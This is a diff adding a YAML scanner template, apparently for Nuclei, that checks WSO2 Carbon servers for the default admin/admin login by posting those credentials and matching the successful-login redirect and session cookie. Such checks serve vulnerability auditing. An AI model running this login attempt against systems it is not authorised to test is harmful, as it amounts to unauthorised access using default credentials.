@@ -1,0 +1,27 @@
+id: poc-yaml-wso2-carbon-pass-weak
+info:
+  name: WSO2 Carbon Server Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password,wso2
+http:
+  - raw:
+      - |
+        POST /carbon/admin/login_action.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/carbon/admin/index.jsp?loginStatus=true"
+      - type: word
+        part: header
+        words:
+          - "JSESSIONID"
